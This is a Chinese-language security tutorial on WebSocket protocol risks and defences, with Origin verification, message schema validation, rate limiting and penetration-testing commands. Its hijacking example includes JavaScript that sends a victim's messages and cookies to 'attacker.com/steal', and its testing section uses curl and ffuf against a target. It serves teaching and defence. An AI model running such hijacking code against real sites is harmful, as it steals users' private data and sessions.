# WebSocket 安全深度

## 协议基础

WebSocket 协议 (RFC 6455) 使用 HTTP Upgrade 机制在单条 TCP 连接上建立全双工通信。这给安全带来了独特挑战——传统的 HTTP 安全控制（CORS/CSP）在 WebSocket 中不总是生效。

### 握手请求
```
GET /ws HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://example.com
```

---

## 1. 常见漏洞与攻击

### CSWSH（跨站点 WebSocket 劫持）

WebSocket 不受同源策略限制——任何页面都可以发起 WebSocket 连接。如果服务端不验证 Origin，攻击者可读取用户数据。

```javascript
// 攻击者页面: attacker.com
const ws = new WebSocket('wss://victim.com/ws');
ws.onopen = () => ws.send(JSON.stringify({type: "get_messages"}));
ws.onmessage = (e) => {
    // 窃取用户的所有私信
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({session: document.cookie, data: e.data})
    });
};
```

**防护方案**：

```javascript
// 服务端 Origin 验证（Node.js + ws）
const WebSocket = require('ws');
const ALLOWED_ORIGINS = ['https://example.com', 'https://app.example.com'];

const wss = new WebSocket.Server({
    verifyClient: (info, cb) => {
        const origin = info.origin;
        if (!ALLOWED_ORIGINS.includes(origin)) {
            console.log(`Blocked WebSocket from ${origin}`);
            cb(false, 403, 'Origin not allowed');
            return;
        }

        // 验证 CSRF Token（URL 参数中）
        const url = new URL(info.req.url, 'https://example.com');
        const token = url.searchParams.get('token');
        if (!validateToken(token)) {
            cb(false, 401, 'Invalid token');
            return;
        }

        cb(true);
    }
});
```

### 消息注入

```javascript
// 服务端消息验证
class WebSocketMessageValidator {
    static SCHEMA = {
        'chat.message': {
            required: ['roomId', 'content'],
            types: {roomId: 'string', content: 'string'},
            maxLength: {content: 5000}
        },
        'presence.update': {
            required: ['status'],
            enum: {status: ['online', 'away', 'offline']}
        },
        'heartbeat': {}
    };

    static validate(message) {
        try {
            const parsed = typeof message === 'string' ?
                JSON.parse(message) : message;

            if (!parsed.type) throw new Error('Missing type');

            const schema = this.SCHEMA[parsed.type];
            if (!schema) throw new Error(`Unknown type: ${parsed.type}`);

            // 验证必填字段
            for (const field of (schema.required || [])) {
                if (!(field in parsed)) {
                    throw new Error(`Missing field: ${field}`);
                }
            }

            // 验证长度
            if (schema.maxLength) {
                for (const [field, max] of Object.entries(schema.maxLength)) {
                    if (parsed[field] && parsed[field].length > max) {
                        throw new Error(`${field} exceeds max length ${max}`);
                    }
                }
            }

            return {valid: true, parsed};
        } catch (e) {
            return {valid: false, error: e.message};
        }
    }
}
```

---

## 2. DoS 防护

```javascript
class WebSocketDoSProtection {
    constructor(wss) {
        this.connections = new Map();  // IP → {count, lastMessage}
        this.MAX_CONNS_PER_IP = 5;
        this.MAX_MESSAGE_RATE = 100;   // messages per minute
        this.MAX_MESSAGE_SIZE = 64 * 1024;  // 64KB
    }

    onConnection(ws, req) {
        const ip = req.socket.remoteAddress;

        // 限制每 IP 连接数
        const conns = this.connections.get(ip) || {count: 0, messages: []};
        if (conns.count >= this.MAX_CONNS_PER_IP) {
            ws.close(1013, 'Too many connections');
            return false;
        }

        conns.count++;
        this.connections.set(ip, conns);

        ws.on('message', (data) => {
            // 消息大小限制
            if (data.length > this.MAX_MESSAGE_SIZE) {
                ws.close(1009, 'Message too large');
                return;
            }

            // 频率限制（滑动窗口）
            const now = Date.now();
            conns.messages = conns.messages.filter(t => now - t < 60000);

            if (conns.messages.length >= this.MAX_MESSAGE_RATE) {
                ws.close(1008, 'Rate limit exceeded');
                return;
            }

            conns.messages.push(now);
        });

        ws.on('close', () => {
            conns.count = Math.max(0, conns.count - 1);
        });

        return true;
    }
}
```

---

## 3. WebSocket 渗透测试

```bash
# 1. 连接测试
wscat -c wss://target.com/ws
# 输入: {"type":"test"} → 观察响应

# 2. Origin 绕过测试
curl -H "Origin: https://evil.com" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  https://target.com/ws

# 3. 消息注入 Fuzz
ffuf -w payloads/ssti.txt -u wss://target.com/ws \
  -d '{"type":"message","content":"FUZZ"}'

# 4. Burp Suite WebSocket 拦截
# Proxy → WebSockets History → 重放/修改消息
```

---

## 参考资源

- [RFC 6455 — The WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)
- [PortSwigger: WebSocket Security](https://portswigger.net/web-security/websockets)

---

*上一篇：[OAuth 与 SSO 安全](12-oauth-sso.md)*
